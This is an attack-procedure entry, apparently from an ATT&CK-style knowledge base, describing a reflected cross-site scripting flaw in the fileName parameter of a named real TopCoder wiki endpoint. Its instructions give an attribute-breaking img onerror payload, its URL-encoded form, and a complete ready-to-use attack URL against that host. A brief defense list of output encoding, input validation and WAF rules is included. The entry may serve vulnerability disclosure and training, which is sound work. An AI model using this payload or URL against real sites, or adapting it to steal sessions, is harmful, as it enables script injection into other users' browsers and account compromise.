---
id: a7bdc18d-fe8c-4c7a-8a0f-8eeaa35c40e2
name: Inject-XSS-Payload-into-fileName-Parameter
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.086Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss-injection
  - payload-craft
  - url-encoding
commands: []
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Inject-XSS-Payload-into-fileName-Parameter

## Summary

This procedure crafts and injects a JavaScript payload into the fileName parameter of the TopCoder wiki's doeditattachment.action endpoint to exploit the reflected XSS vulnerability.

## Description

The root cause is the lack of HTML escaping for the fileName parameter in the error message. By breaking out of the attribute context with quotes and injecting an <img> tag with onerror handler, arbitrary JS executes. This targets web browsers and requires URL encoding for delivery.

## Requirements

1. Knowledge of the vulnerable URL structure
2. URL encoding tool or manual encoding
3. Web browser for testing

## Defense

Defensive measures and detection strategies:

- Apply output encoding to all user inputs in error messages
- Validate and sanitize fileName parameters
- Deploy Web Application Firewall (WAF) rules for XSS patterns

## Objectives

1. Create a functional XSS payload
2. Encode and insert into URL
3. Test payload execution locally

## Instructions

### Step 1: Craft Raw Payload

**Context**: Design the JS injection to close the attribute and execute on error.

Payload: s"><img src=X onerror=alert(document.domain)>::ss.svg

> This breaks out of the fileName attribute and runs JS if image fails to load.

### Step 2: URL Encode and Inject

**Context**: Encode the payload and append to the vulnerable URL.

Encoded: s%22%3E%3Cimg%20src=X%20onerror=alert(document.domain)%3E%3Ass.svg
Full URL: https://apps.topcoder.com/wiki/pages/doeditattachment.action?pageId=165871793&fileName=s%22%3E%3Cimg%20src=X%20onerror=alert(document.domain)%3E%3Ass.svg

> Access the URL to verify reflection and execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-injection]]
- [[payload-craft]]
- [[url-encoding]]
